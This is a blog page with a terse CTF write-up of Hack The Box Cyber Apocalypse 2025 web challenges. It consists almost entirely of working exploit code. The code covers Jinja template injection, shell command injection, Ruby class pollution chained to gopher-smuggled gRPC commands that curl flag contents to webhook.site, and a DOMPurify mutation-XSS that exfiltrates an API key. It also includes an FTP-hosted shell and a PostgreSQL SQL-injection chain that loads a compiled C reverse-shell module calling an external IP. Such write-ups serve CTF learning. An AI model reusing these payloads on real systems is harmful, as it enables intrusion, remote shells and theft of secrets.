<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  
    <title>your-title-here :: elmosalamy | blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Web: Trial By Fire - Very Easy import httpx url = &amp;#39;http://83.136.249.101:33732&amp;#39; with httpx.Client(base_url=url) as client: r = client.post(&amp;#39;/begin&amp;#39;, data=dict(warrior_name=&amp;#34;{{lipsum.__globals__.os.popen(&amp;#39;cat flag." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="//localhost:1313/posts/htb-cyber-apocalypse-2025-writeup---all-web-and-blockchain/" />




<link rel="stylesheet" href="//localhost:1313/assets/style.css">

  <link rel="stylesheet" href="//localhost:1313/assets/green.css">



<link rel="stylesheet" href="//localhost:1313/style.css">


<link rel="apple-touch-icon" href="//localhost:1313/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="//localhost:1313/img/favicon/green.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="your-title-here">
<meta property="og:description" content="your-description-here" />
<meta property="og:url" content="//localhost:1313/posts/htb-cyber-apocalypse-2025-writeup---all-web-and-blockchain/" />
<meta property="og:site_name" content="elmosalamy | blog" />

  <meta property="og:image" content="//localhost:1313/images/your-img-here.jpg">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2025-03-28 00:00:00 &#43;0000 UTC" />












   <script id="mathjax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
<script>
  MathJax = {
    tex: {
      displayMath: [['$$', '$$']],  
      inlineMath: [['$', '$']]      
    }
  };
</script>

 
</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    elmosalamy
  </div>
</a>

    </div>
    
      <div class="menu-trigger">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a target="" href="/posts">üìù Posts</a></li>
        
      
        
          <li><a target="" href="/tags">üè∑Ô∏è Tags</a></li>
        
      
        
          <li><a target="_blank" href="https://aelmosalamy.github.io">üîó Random stuff</a></li>
        
      
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/posts">üìù Posts</a></li>
      
    
      
        <li><a href="/tags">üè∑Ô∏è Tags</a></li>
      
    
      
        <li><a href="https://aelmosalamy.github.io">üîó Random stuff</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="//localhost:1313/posts/htb-cyber-apocalypse-2025-writeup---all-web-and-blockchain/">your-title-here</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2025-03-28 
      </span>
    
    
    <span class="post-author">:: aelmo</span>
    
  </div>

  
  <span class="post-tags">
    
    #<a href="//localhost:1313/tags/ctf/">ctf</a>&nbsp;
    
  </span>
  

  
    <img src="//localhost:1313/images/your-img-here.jpg" class="post-cover" alt="your-title-here" />
  

  
    <div class="table-of-contents">
      <h2>
        
          Table of Contents
        
      </h2>
      <nav id="TableOfContents"></nav>
    </div>
  

  <div class="post-content"><div>
        <h1 id="web-trial-by-fire---very-easy">Web: Trial By Fire - Very Easy<a href="#web-trial-by-fire---very-easy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> httpx
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://83.136.249.101:33732&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> httpx<span style="color:#f92672">.</span>Client(base_url<span style="color:#f92672">=</span>url) <span style="color:#66d9ef">as</span> client:
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;/begin&#39;</span>, data<span style="color:#f92672">=</span>dict(warrior_name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{{lipsum.__globals__.os.popen(&#39;cat flag.txt&#39;).read()}}&#34;</span>))
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;/battle-report&#39;</span>, data<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;damage_dealt=68&amp;damage_taken=105&amp;spells_cast=2&amp;turns_survived=3&amp;outcome=defeat&amp;battle_duration=26.945&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(r<span style="color:#f92672">.</span>text)
</span></span></code></pre></div><p><code>HTB{Fl4m3_P34ks_Tr14l_Burn5_Br1ght_e9f8c148ac7f49bb3d2d00093473056d}</code></p>
<h1 id="web-whispers-of-the-moonbeam---very-easy">Web: Whispers of The Moonbeam - Very Easy<a href="#web-whispers-of-the-moonbeam---very-easy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>We notice <code>gossip</code> displays an <code>ls</code>-like output. Command injection:</p>
<pre tabindex="0"><code>gossip ; cat flag.txt
</code></pre><p><img src="whispers_htb.png"></p>
<p><code>HTB{Sh4d0w_3x3cut10n_1n_Th3_M00nb34m_T4v3rn_8bafcd34a8f4593225ff0b8ee006ac88}</code></p>
<h1 id="web-eldoria-realms---medium">Web: Eldoria Realms - Medium<a href="#web-eldoria-realms---medium" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>Ruby class pollution into gRPC command injection</p>
<ul>
<li><a href="https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html">https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html</a></li>
<li><a href="https://bkubiak.github.io/grpc-raw-requests/">https://bkubiak.github.io/grpc-raw-requests/</a></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> httpx
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://94.237.63.165:53622&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># url = &#39;http://localhost:1337&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> httpx<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/player-status&#39;</span>)
</span></span><span style="display:flex;"><span>print(r)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># raw grpc http2 bytes from wireshark</span>
</span></span><span style="display:flex;"><span>magic    <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;505249202a20485454502f322e300d0a0d0a534d0d0a0d0a&#39;</span>
</span></span><span style="display:flex;"><span>settings <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;000000040000000000000006040000000000000500004000000000040100000000000000040100000000&#39;</span>
</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;000061010400000001838645986283772af9cddcb7c691ee2d9dcc42b17a7293ae328e84cf418b089d5c0b8170dc6c006c3f5f8b1d75d0620d263d4c4d65647a8a9acac8b4c7602bb815c140027465864d833505b11f408e9acac8b0c842d6958b510f21aa9b839bd9ab&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ip=; curl hook -d &#34;x=$(cat /fl*)&#34;</span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;00005b00010000000100000000560a543b6375726c2068747470733a2f2f776562686f6f6b2e736974652f62666661383561392d633139642d346538632d623630392d336565653436363038313633202d642022783d2428636174202f666c2a29222023&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> magic <span style="color:#f92672">+</span> settings <span style="color:#f92672">+</span> headers <span style="color:#f92672">+</span> data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>encoded <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(payload), <span style="color:#ae81ff">2</span>):
</span></span><span style="display:flex;"><span>    encoded <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;%&#39;</span> <span style="color:#f92672">+</span> payload[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(encoded)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html</span>
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> httpx<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/merge-fates&#39;</span>, json<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;class&#34;</span>:
</span></span><span style="display:flex;"><span>                                           {<span style="color:#e6db74">&#34;superclass&#34;</span>:
</span></span><span style="display:flex;"><span>                                            {<span style="color:#e6db74">&#34;realm_url&#34;</span>: <span style="color:#e6db74">&#34;gopher://127.0.0.1:50051/a&#34;</span> <span style="color:#f92672">+</span> encoded}}})
</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> httpx<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/connect-realm&#39;</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>)
</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
</span></span></code></pre></div><p><code>HTB{p0llut3_4nd_h1t_pr0toc0lz_w_4_sw1tch_b3c81179fbcfe17e57f49e24d64f1240}</code></p>
<h1 id="web-eldoria-panel---medium">Web: Eldoria Panel - Medium<a href="#web-eldoria-panel---medium" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>There was a mutation XSS in DOMPurify 3.1.2:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://127.0.0.1:80/api/updateStatus&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/plain&#34;</span>
</span></span><span style="display:flex;"><span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;inp&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{&#34;status&#34;: &#34;&lt;form id&#39;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">btoa</span><span style="color:#e6db74">`
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  setTimeout(() =&gt; {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    fetch(&#39;http://webhook.site/bffa85a9-c19d-4e8c-b609-3eee46608163?exfil=&#39;+apiKey.textContent)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  }, 1000)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">xss</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">\\&#34;x \\&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;svg&gt;&lt;style&gt;&lt;a id=\\&#34;&lt;/style&gt;&lt;img src=x onerror=eval(atob\`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">payload</span><span style="color:#e6db74">}</span><span style="color:#e6db74">\`)&gt;\\&#34;&gt;&lt;/a&gt;&lt;/style&gt;&lt;/svg&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/form&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;input form=\\&#34;x\\&#34; name=\\&#34;namespaceURI\\&#34;&gt;\&#34;}`</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;load&#34;</span>, <span style="color:#66d9ef">async</span> () =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">inp</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">xss</span>;
</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">submit</span>();
</span></span><span style="display:flex;"><span>  });
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p>They are using <code>file_exists</code>. <code>php://</code> and <code>http://</code> wrappers do not support <code>stats</code> functions. But <code>ftp://</code> does. This allows us to deliver our payload via FTP. We can&rsquo;t use <code>ngrok</code> because twisted uses passive mode which requires two ports. That&rsquo;s why we must use an external server</p>
<p>Unintended after hours of suffering. On my server, host <code>twistd</code> ftp with a shell at <code>login.php</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>twistd -n ftp -p <span style="color:#ae81ff">21</span> -r .
</span></span></code></pre></div><p>Modify the template path to an anonymous FTP share:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span> curl http://94.237.58.215:42557/api/admin/appSettings -b PHPSESSID<span style="color:#f92672">=</span>62737133bf4e771f2bb1ddd694545a83 -H <span style="color:#e6db74">&#39;X-API-Kea7242928e01a&#39;</span> -d <span style="color:#e6db74">&#39;{&#34;template_path&#34;: &#34;ftp://anonymous@mydomain.com&#34;}&#39;</span>
</span></span></code></pre></div><p>Visit <code>/?1=cat /flag.txt</code>:
<code>HTB{p41n_c4us3d_by_th3_usu4l_5u5p3ct_d16c96bc407976fddf4b45d3ec032cf6}</code></p>
<h1 id="web-aurors-archive---hard">Web: Aurors Archive - Hard<a href="#web-aurors-archive---hard" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>We write this module:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>include <span style="color:#f92672">&lt;</span>stdio.h<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/in.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;arpa/inet.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;postgres.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;fmgr.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef PG_MODULE_MAGIC
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>PG_MODULE_MAGIC;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">_init</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> port <span style="color:#f92672">=</span> <span style="color:#ae81ff">13492</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sockaddr_in revsockaddr;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> sockt <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    revsockaddr.sin_family <span style="color:#f92672">=</span> AF_INET;
</span></span><span style="display:flex;"><span>    revsockaddr.sin_port <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(port);
</span></span><span style="display:flex;"><span>    revsockaddr.sin_addr.s_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">inet_addr</span>(<span style="color:#e6db74">&#34;3.64.4.198&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">connect</span>(sockt, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>) <span style="color:#f92672">&amp;</span>revsockaddr,
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">sizeof</span>(revsockaddr));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dup2</span>(sockt, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dup2</span>(sockt, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dup2</span>(sockt, <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">const</span> argv[] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;sh&#34;</span>, NULL};
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">execvp</span>(<span style="color:#e6db74">&#34;sh&#34;</span>, argv);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>To compile it, we find the package name <a href="https://alpine.pkgs.org/3.21/alpine-main-x86_64/postgresql17-dev-17.4-r0.apk.html">for Alpine</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>apk add postgresql17-dev
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gcc -I<span style="color:#66d9ef">$(</span>pg_config --includedir-server<span style="color:#66d9ef">)</span> -shared -fPIC -nostartfiles -o payload.so payload.c
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>payload.c           payload.so
</span></span></code></pre></div><p>Base64 encoding and uploading the file, we run any query, and boom! We get a hit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;[*] Payload started&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. find config loc</span>
</span></span><span style="display:flex;"><span>sqli(<span style="color:#e6db74">&#39;sourcefile FROM pg_file_settings&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. load malicious config from file</span>
</span></span><span style="display:flex;"><span>sqli(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;CAST((SELECT lo_from_bytea(133338, decode(&#39;</span><span style="color:#e6db74">{</span>malicious_config<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;hex&#39;))) AS text)&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. write malicious file to disk</span>
</span></span><span style="display:flex;"><span>sqli(<span style="color:#e6db74">&#34;CAST((SELECT lo_export(133338, &#39;/var/lib/postgresql/data/postgresql.conf&#39;)) AS text)&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 4. get version</span>
</span></span><span style="display:flex;"><span>sqli(<span style="color:#e6db74">&#34;version()&#34;</span>)
</span></span><span style="display:flex;"><span>sqli(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;CAST((SELECT lo_from_bytea(133340, decode(&#39;</span><span style="color:#e6db74">{</span>so_base64<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;base64&#39;))) AS text)&#34;</span>)
</span></span><span style="display:flex;"><span>sqli(<span style="color:#e6db74">&#34;CAST((SELECT lo_export(133340, &#39;/tmp/payload.so&#39;)) AS text)&#34;</span>)
</span></span><span style="display:flex;"><span>sqli(<span style="color:#e6db74">&#34;CAST((SELECT pg_reload_conf()) AS text)&#34;</span>)
</span></span></code></pre></div><p><img src="aurors_flag.png"></p>
<p><code>HTB{l00k_0ut_f0r_0auth_155u35}</code></p>

      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        
        <span class="button next">
            <a href="//localhost:1313/posts/hack-my-bot-pwnme-2025-ctf/">
                <span class="button__text">Hack The Bot Writeup for Beginners (PwnMe 2025 CTF)</span>
                <span class="button__icon">‚Üí</span>
            </a>
        </span>
        
    </div>
</div>

  

  <div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "elmosalamy" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>¬© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="//localhost:1313/assets/main.js"></script>
<script src="//localhost:1313/assets/prism.js"></script>







  
</div>

</body>
</html>
